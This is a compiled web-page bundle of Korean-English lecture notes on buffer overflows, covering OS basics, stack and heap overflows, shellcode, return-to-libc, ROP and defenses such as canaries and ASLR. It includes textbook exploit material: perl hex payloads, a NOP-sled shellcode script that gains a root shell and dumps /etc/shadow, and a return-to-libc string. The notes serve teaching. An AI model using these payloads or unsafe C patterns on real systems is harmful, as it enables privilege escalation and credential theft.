import{_ as a,c as i,a as l,o as s}from"./app-CFlH2mst.js";const n="/assets/image-7-B2TUc89A.png",r="/assets/image-8-Bm9dkB8z.png",t="/assets/image-9-aVZEzi14.png",o="/assets/image-10-C3O5GdkE.png",c="/assets/image-11-BVHWciZn.png",d="/assets/image-13-DNDraS_F.png",p="/assets/image-14-BcN7G4uK.png",u="/assets/image-15-BLaotS5R.png",m="/assets/image-16-BgOD9KW7.png",h={};function f(b,e){return s(),i("div",null,[...e[0]||(e[0]=[l('<h1 id="_09-buffer-overflow" tabindex="-1"><a class="header-anchor" href="#_09-buffer-overflow"><span>09. Buffer Overflow</span></a></h1><h1 id="os-overview" tabindex="-1"><a class="header-anchor" href="#os-overview"><span>OS Overview</span></a></h1><h2 id="operating-system" tabindex="-1"><a class="header-anchor" href="#operating-system"><span>Operating System</span></a></h2><ul><li>Multiprogramming: 효율성 필요</li><li>Job (code, 데이터) 조직화 -&gt; CPU가 항상 하나를 실행하도록 보장</li><li>Job scheduling: Job 중 하나를 선택하여 실행</li><li>Wait (e.g., I/O) 발생 시, OS가 다른 job으로 전환</li><li>Timesharing (multitasking): CPU가 job을 매우 빈번하게 전환, interactive computing 생성</li><li>Response time 최소화</li><li>각 사용자는 memory에서 실행 중인 하나 이상의 프로그램 (process) 보유</li><li>CPU scheduling: 여러 job이 동시에 실행 준비될 때</li><li>Swapping: Process가 memory에 맞지 않을 때</li><li>Virtual memory: Process가 memory에 완전히 없어도 실행 허용</li></ul><h2 id="operating-system-operations" tabindex="-1"><a class="header-anchor" href="#operating-system-operations"><span>Operating System Operations</span></a></h2><ul><li>Dual-mode operation: OS가 자신과 다른 시스템 구성 요소 보호</li><li>User mode 및 kernel mode</li><li>Mode bit: Hardware가 제공</li><li>시스템이 user code 실행 중인지 kernel code 실행 중인지 구별</li><li>Privileged instructions: Kernel mode에서만 실행 가능</li><li>System call: Mode를 kernel로 변경, call로부터 return 시 user로 재설정</li></ul><h2 id="process-management" tabindex="-1"><a class="header-anchor" href="#process-management"><span>Process Management</span></a></h2><ul><li>Process: 실행 중인 프로그램 (A 프로그램 in execution)</li><li>시스템 내 작업 단위 (unit of work)</li><li>Program: 수동적 entity, Process: 능동적 entity</li><li>Process 자원 필요: CPU, memory, I/O, files, initialization 데이터</li><li>Process 종료: 재사용 가능한 자원 회수</li><li>Single-threaded process: 다음 실행할 instruction 위치 지정하는 프로그램 counter 1개</li><li>Multi-threaded process: Thread 당 프로그램 counter 1개</li></ul><h2 id="memory-management" tabindex="-1"><a class="header-anchor" href="#memory-management"><span>Memory Management</span></a></h2><ul><li>모든 데이터: 처리 전후 memory에 위치</li><li>모든 instructions: 실행 위해 memory에 위치</li><li>Memory management: CPU utilization 및 response time 최적화</li><li>활동: <ul><li>Memory 사용 현황 및 사용자 추적</li><li>Process (또는 그 일부) 및 데이터의 memory 이동 결정</li><li>Memory 공간 할당 및 해제</li></ul></li></ul><h2 id="storage-management" tabindex="-1"><a class="header-anchor" href="#storage-management"><span>Storage Management</span></a></h2><ul><li>OS: 정보 저장소에 대한 통일된 논리적 view 제공</li><li>물리적 속성을 논리적 저장 단위 (file)로 추상화</li><li>File-System management:</li><li>File을 directory로 조직</li><li>Access control: 접근 권한 결정</li><li>OS 활동:</li><li>File, directory 생성 및 삭제</li><li>File, directory 조작 primitive</li><li>File을 secondary storage에 mapping</li><li>File을 stable storage media에 backup</li></ul><h2 id="a-view-of-operating-system-services" tabindex="-1"><a class="header-anchor" href="#a-view-of-operating-system-services"><span>A View of Operating System Services</span></a></h2><h2 id="system-calls" tabindex="-1"><a class="header-anchor" href="#system-calls"><span>System Calls</span></a></h2><ul><li>OS가 제공하는 서비스에 대한 programming interface</li><li>일반적으로 high-level language (C or C++)로 작성</li><li>직접 system call 사용보다 high-level API (Application 프로그램 Interface) 통해 접근</li><li>open(): system call</li><li>fopen(): API (C language library)</li><li>3대 API: Win32 (Windows), POSIX (UNIX, Linux, Mac OS X), Java (JVM)</li><li>API 사용 이유: Portability, Ease of use</li></ul><h2 id="system-call-implementation" tabindex="-1"><a class="header-anchor" href="#system-call-implementation"><span>System Call Implementation</span></a></h2><ul><li>일반적으로 각 system call에 숫자(number) 연관</li><li>System-call interface: 이 숫자에 따라 index된 table 유지</li><li>Interface: OS kernel에서 의도한 system call 호출, system call 상태 및 return 값 반환</li><li>Caller: system call 구현 방식 알 필요 없음</li><li>API 준수 및 OS 결과 이해</li><li>API: OS interface 세부 사항 programmer에게 숨김</li></ul><h2 id="api-–-system-call-–-os-relationship" tabindex="-1"><a class="header-anchor" href="#api-–-system-call-–-os-relationship"><span>API – System Call – OS Relationship</span></a></h2><ul><li>Use system call, directly</li></ul><h2 id="standard-c-library-example" tabindex="-1"><a class="header-anchor" href="#standard-c-library-example"><span>Standard C Library Example</span></a></h2><ul><li>C program: print<code>f()</code> (library call) 호출 -&gt; write() (system call) 호출</li></ul><h2 id="examples-of-windows-and-unix-system-calls" tabindex="-1"><a class="header-anchor" href="#examples-of-windows-and-unix-system-calls"><span>Examples of Windows and Unix System Calls</span></a></h2><h1 id="buffer-overflow" tabindex="-1"><a class="header-anchor" href="#buffer-overflow"><span>Buffer Overflow</span></a></h1><h2 id="buffer-overflow-1" tabindex="-1"><a class="header-anchor" href="#buffer-overflow-1"><span>Buffer Overflow</span></a></h2><ul><li>A very common attack mechanism</li><li>1988년 Morris Worm이 처음 널리 사용</li><li>Prevention techniques 알려짐</li><li>여전히 주요 관심사:</li><li>Legacy buggy code</li><li>프로그래머의 부주의한 programming practices 지속</li></ul><h1 id="brief-history-of-buffer-overflow-attacks" tabindex="-1"><a class="header-anchor" href="#brief-history-of-buffer-overflow-attacks"><span>Brief History of Buffer Overflow Attacks</span></a></h1><h2 id="buffer-overflow-buffer-overrun" tabindex="-1"><a class="header-anchor" href="#buffer-overflow-buffer-overrun"><span>Buffer Overflow/Buffer Overrun</span></a></h2><ul><li>NIST Glossary 정의: <blockquote><p><em>&quot;A condition at an interface under which more input can be placed into a buffer or 데이터 holding area than the capacity allocated, overwriting other information. Attackers exploit such a condition to crash a system or to insert specially crafted code that allows them to gain control of the system.”</em></p></blockquote></li><li>(요약) Buffer 용량 초과 input -&gt; 다른 정보 덮어쓰기</li><li>Attacker: 시스템 crash 또는 code 삽입 (시스템 제어)</li></ul><h2 id="buffer-overflow-basics" tabindex="-1"><a class="header-anchor" href="#buffer-overflow-basics"><span>Buffer Overflow Basics</span></a></h2><ul><li>Programming error: process가 fixed-sized buffer 한계 초과 데이터 저장 시도</li><li>인접 memory 위치 덮어쓰기</li><li>덮어쓰는 위치: 프로그램 variables, parameters, 프로그램 control flow 데이터</li><li>Buffer 위치: stack, heap, 데이터 section</li><li>결과 (Consequences): <ul><li>프로그램 데이터 손상</li><li>예기치 않은 control 전송</li><li>Memory access 위반</li><li>Attacker가 선택한 code 실행</li></ul></li></ul><h2 id="basic-buffer-overflow-example" tabindex="-1"><a class="header-anchor" href="#basic-buffer-overflow-example"><span>Basic Buffer Overflow Example</span></a></h2><p><img src="'+n+'" alt="alt text"></p><blockquote><p><strong>Figure 10.1</strong> Basic Buffer Overflow Example</p></blockquote><h2 id="basic-buffer-overflow-stack-values" tabindex="-1"><a class="header-anchor" href="#basic-buffer-overflow-stack-values"><span>Basic Buffer Overflow Stack Values</span></a></h2><p><img src="'+r+'" alt="alt text"></p><blockquote><p><strong>Figure 10.2</strong> Basic Buffer Overflow Stack Values</p></blockquote><h2 id="buffer-overflow-attacks" tabindex="-1"><a class="header-anchor" href="#buffer-overflow-attacks"><span>Buffer Overflow Attacks</span></a></h2><ul><li>Exploit 필요 조건: <ul><li>Attacker 제어 하의 데이터로 trigger 가능한 buffer overflow 취약점 식별</li><li>Buffer 저장 방식 이해, 손상 가능성 판단</li></ul></li><li>취약 프로그램 식별 방법: <ul><li>프로그램 source 검사</li><li>Oversized input 처리 시 프로그램 실행 추적</li><li>Fuzzing (자동 식별 도구) 사용</li></ul></li></ul><h2 id="programming-language-history" tabindex="-1"><a class="header-anchor" href="#programming-language-history"><span>Programming Language History</span></a></h2><ul><li>Machine level: 데이터는 register 또는 memory에 저장</li><li>Assembly language: 프로그래머가 데이터 해석 책임</li></ul><p><img src="'+t+'" alt="alt text"></p><h2 id="stack-buffer-overflows" tabindex="-1"><a class="header-anchor" href="#stack-buffer-overflows"><span>Stack Buffer Overflows</span></a></h2><ul><li>Buffer가 stack에 위치할 때 발생 (stack smashing)</li><li>Morris Worm이 사용 (unchecked buffer overflow exploit)</li><li>여전히 널리 exploit 됨</li><li>Stack frame: <ul><li>함수 호출 시 return address 저장</li><li>호출된 함수로 전달될 parameter 저장</li><li>Register 값 저장</li></ul></li></ul><h2 id="stack-frame-with-functions-p-and-q" tabindex="-1"><a class="header-anchor" href="#stack-frame-with-functions-p-and-q"><span>Stack Frame with Functions P and Q</span></a></h2><p><img src="'+o+'" alt="alt text"></p><blockquote><p><strong>Figure 10.3</strong> Example Stack Frame with Functions P and Q</p></blockquote><h2 id="programs-and-processes" tabindex="-1"><a class="header-anchor" href="#programs-and-processes"><span>Programs and Processes</span></a></h2><p><img src="'+c+`" alt="alt text"></p><blockquote><p><strong>Figure 10.4</strong> Program Loading into Process Memory</p></blockquote><h2 id="stack-overflow-example" tabindex="-1"><a class="header-anchor" href="#stack-overflow-example"><span>Stack Overflow Example</span></a></h2><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text"><pre><code class="language-text"><span class="line">void hello(char *tag) {</span>
<span class="line">  char inp[16];</span>
<span class="line"></span>
<span class="line">  printf(&quot;Enter value for %s: &quot;, tag);</span>
<span class="line">  gets(inp);</span>
<span class="line">  printf(&quot;Hello your %s is %s\\n&quot;, tag, inp);</span>
<span class="line">}</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>(a) Basic stack overflow C code</p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text"><pre><code class="language-text"><span class="line">$ cc -g -o buffer2 buffer2.c</span>
<span class="line"></span>
<span class="line">$ ./buffer2</span>
<span class="line"></span>
<span class="line">Enter value for name: Bill and Lawrie</span>
<span class="line">Hello your name is Bill and Lawrie</span>
<span class="line">buffer2 done</span>
<span class="line"></span>
<span class="line">$ ./buffer2</span>
<span class="line">Enter value for name: XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span>
<span class="line">Segmentation fault (core dumped)</span>
<span class="line"></span>
<span class="line">$ perl -e &#39;print pack(&quot;H*&quot;, &quot;41424344454647485152535455565758616263646566676808fcffbf948304080a4e4e4e0a&quot;);&#39; | ./buffer2</span>
<span class="line">Enter value for name:</span>
<span class="line">Hello your Re?ppy\\]uEA is ABCDEFAGHQRSTUVWXabcdefguyu</span>
<span class="line">Enter value for Kyyu:</span>
<span class="line">Hello your Kyyu is NNNN</span>
<span class="line">Segmentation fault (core dumped)</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>(b) Basic stack overflow examples runs</p><blockquote><p><strong>Figure 10.5</strong> Basic Stack Overflow Example</p></blockquote><p><img src="`+d+'" alt="alt text"></p><blockquote><p><strong>Figure 10.6</strong> Basic Stack Overflow Stack Values</p></blockquote><p><img src="'+p+'" alt="alt text"></p><blockquote><p><strong>Figure 10.7</strong> Another Stack Overflow Example</p></blockquote><h2 id="common-unsafe-c-standard-library-routines" tabindex="-1"><a class="header-anchor" href="#common-unsafe-c-standard-library-routines"><span>Common Unsafe C Standard Library Routines</span></a></h2><p><img src="'+u+'" alt="alt text"></p><blockquote><p><strong>Table 10.2</strong> Some Common Unsafe C Standard Library Routines</p></blockquote><h2 id="shellcode" tabindex="-1"><a class="header-anchor" href="#shellcode"><span>Shellcode</span></a></h2><ul><li>Attacker가 제공하는 code <ul><li>Overflow된 buffer에 저장</li><li>전통적으로 user command-line interpreter (shell)로 제어 전달</li></ul></li><li>Machine code: 특정 processor, operating system 의존</li><li>Metasploit Project: Exploit 연구, IDS 서명 개발 등에 유용한 정보 제공</li></ul><h2 id="example-shellcode" tabindex="-1"><a class="header-anchor" href="#example-shellcode"><span>Example Shellcode</span></a></h2><p><img src="'+m+`" alt="alt text"></p><blockquote><p><strong>Figure 10.8</strong> Example UNIX Shellcode</p></blockquote><h2 id="common-x86-assembly-language-instructions" tabindex="-1"><a class="header-anchor" href="#common-x86-assembly-language-instructions"><span>Common <code>x86</code> Assembly Language Instructions</span></a></h2><h2 id="x86-registers" tabindex="-1"><a class="header-anchor" href="#x86-registers"><span><code>x86</code> Registers</span></a></h2><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text"><pre><code class="language-text"><span class="line">$ dir -l buffer4</span>
<span class="line">-rwsr-xr-x    1 root     knoppix      16571 Jul 17 10:49 buffer4</span>
<span class="line"></span>
<span class="line">$ whoami</span>
<span class="line">knoppix</span>
<span class="line">$ cat /etc/shadow</span>
<span class="line">cat: /etc/shadow: Permission denied</span>
<span class="line"></span>
<span class="line">$ cat attack1</span>
<span class="line">perl -e &#39;print pack(&quot;H*&quot;,</span>
<span class="line">&quot;9090909090909090909090909090&quot; .</span>
<span class="line">&quot;9090909090909090999090909090&quot; .</span>
<span class="line">&quot;9090eb1a5ec3084607d81e895e0889&quot; .</span>
<span class="line">&quot;460cb0b89f38d4e08d5d60ecb80ebef&quot; .</span>
<span class="line">&quot;ffffffe276696e742f3862020202020&quot; .</span>
<span class="line">&quot;2020202020202038fcffbfc0bfbbf0a&quot;); </span>
<span class="line">print &quot;whoami\\n&quot;;</span>
<span class="line">print &quot;cat /etc/shadow\\n&quot;;&#39;</span>
<span class="line"></span>
<span class="line">$ attack1 | buffer4</span>
<span class="line">Enter value for name: Hello your yyy)DAOApy is e?^1AFF.../bin/sh...</span>
<span class="line">root</span>
<span class="line">root:$1$rNLId4rX$nk­a7JlxH7.4UJT4I9JRLk1:13346:0:99999:7:::</span>
<span class="line">daemon:*:11453:0:99999:7:::</span>
<span class="line">...</span>
<span class="line">nobody:*:11453:0:99999:7:::</span>
<span class="line">knoppix:$1$fV2SBKBu$EdSFvuudJKaCH8YOl dnAv/:13346:0:99999:7:::</span>
<span class="line">...</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="stack-overflow-variants" tabindex="-1"><a class="header-anchor" href="#stack-overflow-variants"><span>Stack Overflow Variants</span></a></h2><table><thead><tr><th>target program</th></tr></thead><tbody><tr><td>a trust system utility</td></tr><tr><td>network service deamon</td></tr><tr><td>commonly used library code</td></tr></tbody></table><table><thead><tr><th>Shellcode functions:</th></tr></thead><tbody><tr><td>Remote shell 실행</td></tr><tr><td>Reverse shell 생성 (hacker에게 연결)</td></tr><tr><td>Local exploit (shell 확보)</td></tr><tr><td>Firewall rules flush (다른 공격 차단 해제)</td></tr><tr><td>chroot (restricted execution) 환경 탈출</td></tr></tbody></table><h2 id="buffer-overflow-defenses" tabindex="-1"><a class="header-anchor" href="#buffer-overflow-defenses"><span>Buffer Overflow Defenses</span></a></h2><ul><li>Buffer overflow: 널리 exploit 됨</li><li>2가지 방어 접근: <ul><li>Compile-time: 새 프로그램에서 attack 저항하도록 강화</li><li>Run-time: 기존 프로그램에서 attack 탐지 및 중단</li></ul></li></ul><h2 id="compile-time-defenses-programming-language" tabindex="-1"><a class="header-anchor" href="#compile-time-defenses-programming-language"><span>Compile-Time Defenses: Programming Language</span></a></h2><ul><li>Modern high-level language 사용: <ul><li>Buffer overflow attack에 취약하지 않음</li><li>Compiler가 range checks 및 변수 operation 강제</li></ul></li><li>단점: <ul><li>Run time check 위한 추가 code 실행</li><li>유연성/안전성 vs resource 사용 비용</li><li>Hardware resource 접근 제한 (e.g., device drivers 작성)</li></ul></li></ul><h2 id="compile-time-defenses-safe-coding-techniques" tabindex="-1"><a class="header-anchor" href="#compile-time-defenses-safe-coding-techniques"><span>Compile-Time Defenses: Safe Coding Techniques</span></a></h2><ul><li>C: Type safety &lt; space efficiency, performance 중시</li><li>프로그래머의 주의(due care) 가정</li><li>해결: Code 검사, unsafe coding 재작성</li><li>예: OpenBSD project (기존 code base 감사)</li><li>결과: 가장 안전한 OS 중 하나로 간주</li></ul><h2 id="examples-of-unsafe-c-code" tabindex="-1"><a class="header-anchor" href="#examples-of-unsafe-c-code"><span>Examples of Unsafe C Code</span></a></h2><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text"><pre><code class="language-text"><span class="line">int copy_buf(char *to, int pos, char *from, int len) {</span>
<span class="line">  int i;</span>
<span class="line">  </span>
<span class="line">  for (i = 0; i &lt; len; i++) {</span>
<span class="line">    to[pos] = from[i];</span>
<span class="line">    pos++;</span>
<span class="line">  }</span>
<span class="line">  return pos;</span>
<span class="line">}</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>(a) Unsafe byte copy</p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text"><pre><code class="language-text"><span class="line">short read_chunk(FILE fil, char *to) {</span>
<span class="line">  short len;</span>
<span class="line">  fread(&amp;len, 2, 1, fil);   /* read length of binary data     */</span>
<span class="line">  fread(to, 1, len, fil);   /* read len bytes of binary data  */</span>
<span class="line">  return len;</span>
<span class="line">}</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>(b) Unsafe byte input</p><blockquote><p><strong>Figure 10.10</strong> Examples of Unsafe C Code</p></blockquote><h2 id="compile-time-defenses-language-extensions-safe-libraries" tabindex="-1"><a class="header-anchor" href="#compile-time-defenses-language-extensions-safe-libraries"><span>Compile-Time Defenses: Language Extensions / Safe Libraries</span></a></h2><ul><li>Dynamically allocated memory 처리 문제 (compile time size 정보 없음)</li><li>C의 unsafe standard library routines 사용 문제</li><li>접근: Safer variant로 대체</li><li>예: Libsafe (dynamic library, 기존 standard library보다 먼저 load)</li></ul><h2 id="compile-time-defenses-stack-protection" tabindex="-1"><a class="header-anchor" href="#compile-time-defenses-stack-protection"><span>Compile-Time Defenses: Stack Protection</span></a></h2><ul><li>Function entry, exit code 추가 -&gt; stack 손상 징후 check</li><li>Random canary 사용: <ul><li>예측 불가능해야 함</li><li>다양한 시스템들과 달라야 함</li></ul></li><li>Stackshield, Return Address Defender (RAD): <ul><li>GCC extensions <ul><li>Function entry: return address 복사본 safe region에 저장</li><li>Function exit: stack frame return address vs 복사본 비교 -&gt; 다르면 프로그램 중단</li></ul></li></ul></li></ul><h2 id="run-time-defenses-executable-address-space-protection" tabindex="-1"><a class="header-anchor" href="#run-time-defenses-executable-address-space-protection"><span>Run-Time Defenses: Executable Address Space Protection</span></a></h2><ul><li>Virtual memory 지원 사용 -&gt; 일부 memory region non-executable 설정</li><li>MMU (Memory Management Unit) 지원 필요</li><li>이슈:</li><li>Executable stack code 지원</li><li>특별 조항 필요</li></ul><h2 id="run-time-defenses-address-space-layout-randomization-aslr" tabindex="-1"><a class="header-anchor" href="#run-time-defenses-address-space-layout-randomization-aslr"><span>Run-Time Defenses: Address Space Layout Randomization (ASLR)</span></a></h2><ul><li>Key 데이터 structure (stack, heap, global 데이터) 위치 조작</li><li>Process마다 random shift 사용</li><li>Heap buffer 위치 randomize</li><li>Standard library functions 위치 randomize</li></ul><h2 id="run-time-defenses-guard-pages" tabindex="-1"><a class="header-anchor" href="#run-time-defenses-guard-pages"><span>Run-Time Defenses: Guard Pages</span></a></h2><ul><li>Stack canary랑 비슷한 방법</li><li>Critical memory region 사이에 guard pages 배치</li><li>MMU에서 illegal address로 flag</li><li>접근 시도 시 process 중단</li><li>확장: Stack frame, heap buffer 사이에 guard pages 배치 (execution time cost)</li></ul><h2 id="replacement-stack-frame" tabindex="-1"><a class="header-anchor" href="#replacement-stack-frame"><span>Replacement Stack Frame</span></a></h2><ul><li>Variant: buffer 및 saved frame pointer address 덮어쓰기</li><li>Saved frame pointer 값 변경 -&gt; dummy stack frame 참조</li><li>Current function return -&gt; replacement dummy frame</li><li>제어: Shellcode (in overwritten buffer)</li><li>Off-by-one attacks: 1 byte 더 복사 허용</li><li>Defenses:</li><li>Stack protection (modification 탐지)</li><li>Non-executable stacks</li><li>ASLR</li></ul><h2 id="return-to-system-call" tabindex="-1"><a class="header-anchor" href="#return-to-system-call"><span>Return to System Call</span></a></h2><ul><li>Stack overflow variant: Return address를 standard library function으로 교체</li><li>Non-executable stack 대응</li><li>Attacker: Return address 위 stack에 parameter 구성</li><li>Function returns -&gt; library function 실행</li><li>(2 library call chaining 가능)</li><li>Defenses:</li><li>Stack protection</li><li>Non-executable stacks</li><li>ASLR</li></ul><h2 id="return-to-libc" tabindex="-1"><a class="header-anchor" href="#return-to-libc"><span>Return-to-libc</span></a></h2><ul><li>Code injection 대신 기존 code (e.g., libc function) 사용</li><li>예: <code>system(“/bin/sh”);</code> <code>execve (argv[0],~argv,~NULL);</code></li><li>Exploit 예: <code>“A”*80 + “B”*4 + “\\xe0\\x8a\\x05\\x40” + “AAAA” + “\\xf9\\xbf\\x0f\\x40”</code></li><li><code>echo()</code> return 시, <code>system()</code>이 new shell 실행</li><li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>W</mi><mo>⊕</mo><mi>X</mi></mrow><annotation encoding="application/x-tex">W \\oplus X</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span></span></span></span> (W xor X) model Bypass</li></ul><h2 id="heap-overflow" tabindex="-1"><a class="header-anchor" href="#heap-overflow"><span>Heap Overflow</span></a></h2><ul><li>Heap에 위치한 buffer attack</li><li>Return address 없음 -&gt; 제어 전달 어려움</li><li>Function pointer exploit 또는 management 데이터 structure 조작</li><li>Defenses:</li><li>Making the heap non-executable</li><li>Randomizing the allocation of memory on the heap</li></ul><h2 id="heap-overflow-example" tabindex="-1"><a class="header-anchor" href="#heap-overflow-example"><span>Heap Overflow Example</span></a></h2><h2 id="global-데이터-overflow" tabindex="-1"><a class="header-anchor" href="#global-데이터-overflow"><span>Global 데이터 Overflow</span></a></h2><ul><li>Global 데이터에 위치한 buffer attack</li><li>Function pointer, vulnerable buffer</li><li>Function pointer 덮어쓰기 (나중에 호출됨)</li><li>Defenses:</li><li>Non-executable or random global 데이터 region</li><li>Move function pointers</li><li>Guard pages</li></ul><h2 id="global-데이터-overflow-example" tabindex="-1"><a class="header-anchor" href="#global-데이터-overflow-example"><span>Global 데이터 Overflow Example</span></a></h2><h2 id="return-oriented-programming" tabindex="-1"><a class="header-anchor" href="#return-oriented-programming"><span>Return-Oriented Programming</span></a></h2><ul><li>Concept</li><li>Attack method</li><li>Countermeasures</li><li>(상황) Attacker: <code>f(“foo”)</code> 실행 원함, but</li><li><code>f()</code>가 libc에 없음</li><li><code>f()</code> 위치 randomized</li></ul><h2 id="rop-return-oriented-programming" tabindex="-1"><a class="header-anchor" href="#rop-return-oriented-programming"><span>ROP (Return-Oriented Programming)</span></a></h2><ul><li>Arbitrary (Turing-complete) computation (다음 없이):</li><li>Malicious code injection</li><li>Library function (<code>system()</code>, <code>execve()</code>) call</li><li>Original code 수정</li><li>(단, stack contents (including return address) 변경 필요)</li><li>적용 시스템: Intel <code>x86</code>, ARM, SPARC, Atmel AVR, Z80, PowerPC</li><li>사례: Apple iPhone, Desktop PCs, Special-purpose machines</li></ul><h2 id="general-idea-of-rop" tabindex="-1"><a class="header-anchor" href="#general-idea-of-rop"><span>General Idea of ROP</span></a></h2><ul><li>Idea: Arbitrary computations (shellcode injection, lib function invocation, code modification 없이)</li><li>Approach:</li><li>전체 function 대신 small instruction sequences (e.g., libc의) 사용</li><li>Instruction sequence: 2 ~ 5 instructions, ret instruction으로 종료</li><li>Sequences: gadget으로 chaining</li><li>Gadget: 특정 task 수행 (e.g., load, store, xor, branch)</li><li>Adversary: Gadget 조합 -&gt; 원하는 action 강제</li></ul><h2 id="finding-unintended-instruction-sequences" tabindex="-1"><a class="header-anchor" href="#finding-unintended-instruction-sequences"><span>Finding unintended instruction sequences</span></a></h2><ul><li>libc에 특정 instructions 존재 가정</li><li><code>b8</code> 대신 00 byte stream 해석 시, unintended instruction sequence 획득 가능</li></ul><h2 id="gadget-example-memory-load" tabindex="-1"><a class="header-anchor" href="#gadget-example-memory-load"><span>Gadget Example : Memory Load</span></a></h2><ul><li>Goal: Load <code>0xDEADBEEF</code> (pointed by <code>0x8010ABCD</code>) into <code>%eax</code> register</li><li><ol><li>Find Gadgets -&gt; BoF attack -&gt; Return -&gt; start Sequence 1</li></ol></li><li>Input value: <code>Pattern 1 + Pattern 2 + Ret_addr_1 + “\\x8D\\xAB\\x10\\x80” + Ret_addr_2</code></li><li><ol start="2"><li><code>pop 0x8010AB8D</code> in register <code>%eax</code></li></ol></li><li><ol start="3"><li>Control flow: Sequence 1의 ret instruction -&gt; Sequence 2로 이동</li></ol></li><li><ol start="4"><li>move <code>0xDEADBEEF</code> in register <code>%eax</code></li></ol></li></ul><h2 id="countermeasures" tabindex="-1"><a class="header-anchor" href="#countermeasures"><span>Countermeasures</span></a></h2><ul><li>Return address 보호 방법</li><li>Compiler based solutions:</li><li>Return address backup (onto shadow stack)</li><li>Hardware facilitated solutions:</li><li>Stack 분리 (data-only, call/return addresses-only)</li><li>Call/return stack access control</li><li>Dynamic binary instrumentation (JIT-compiler 기반):</li><li>JIT: Runtime에 instruction block compile -&gt; instrumentation code 추가</li><li>프로그램 shepherding:</li><li>Return target이 valid call site인지 check (return -&gt; call instruction 직후)</li><li>ROPdefender:</li><li>Return address vs shadow stack (valid return addresses) check</li></ul><h2 id="rop-without-returns-9" tabindex="-1"><a class="header-anchor" href="#rop-without-returns-9"><span>ROP without Returns [9]</span></a></h2><ul><li>Features:</li><li>Return address 보호 countermeasure bypass</li><li>Intel <code>x86</code>, ARM 등 적용</li><li>Turing-complete gadget set (without return instruction)</li><li>Approaches:</li><li>Return-like sequences 사용 (Candidates: indirect jumps)</li><li>Intel: jmp *<code>%eax</code></li><li>ARM: blx r3</li><li>Constraints:</li><li><code>%eax</code>, r3 등 register 사전 초기화 필요</li><li>Stack pointer: return 자동 update, indirect jump 아님</li></ul><h2 id="rop-without-returns" tabindex="-1"><a class="header-anchor" href="#rop-without-returns"><span>ROP without Returns</span></a></h2><ul><li>Return-like Sequences:</li><li>Intel: pop <code>%eax</code>; jmp *<code>%eax</code></li><li><ol><li>Target address pop (into <code>%eax</code>)</li></ol></li><li><ol start="2"><li>pop: stack pointer 4 bytes 증가 (return과 유사)</li></ol></li><li><ol start="3"><li>jmp: <code>%eax</code> 저장 address로</li></ol></li><li>ARM:</li><li>pop-jump sequence 없음</li><li>Update-Load-Branch Sequence 사용</li><li><ol><li>(Update) { adds r6,#4 }</li></ol></li><li><ol start="2"><li>(Load) { ldr r5, [r6] }</li></ol></li><li><ol start="3"><li>(Branch) { blx r5 }</li></ol></li><li>Problems: Return-like sequences 찾기 어려움</li></ul>`,123)])])}const v=a(h,[["render",f]]),x=JSON.parse('{"path":"/cs/9.html","title":"09. Buffer Overflow","lang":"ko-KR","frontmatter":{},"git":{"updatedTime":1764305376000,"contributors":[{"name":"kmbzn","username":"kmbzn","email":"kmbzn24@gmail.com","commits":2,"url":"https://github.com/kmbzn"}],"changelog":[{"hash":"f81f9042e7888855a506f92261c74aaa2d86aa2a","time":1764305376000,"email":"kmbzn24@gmail.com","author":"kmbzn","message":"update npm"},{"hash":"9a225eeb65c4142b2102d90eba91afdc4501d305","time":1763650581000,"email":"kmbzn24@gmail.com","author":"kmbzn","message":"Refactor code structure for improved readability and maintainability"}]},"filePathRelative":"cs/9.md"}');export{v as comp,x as data};
